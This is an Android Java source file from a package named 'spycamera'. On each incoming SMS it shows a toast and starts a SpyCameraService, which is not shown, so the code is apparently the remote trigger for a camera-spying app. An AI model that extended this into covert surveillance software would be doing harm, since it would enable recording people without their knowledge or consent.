package com.felight.spycamera;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.widget.Toast;

public class MessageReceive extends BroadcastReceiver {
	
	Intent spy;
	@Override
	public void onReceive(Context context, Intent arg1) {
		System.out.println("sms received");
		Toast.makeText(context, "sms received", Toast.LENGTH_LONG).show();
		spy = new Intent(context, SpyCameraService.class);
		context.startService(spy);		
	}

}
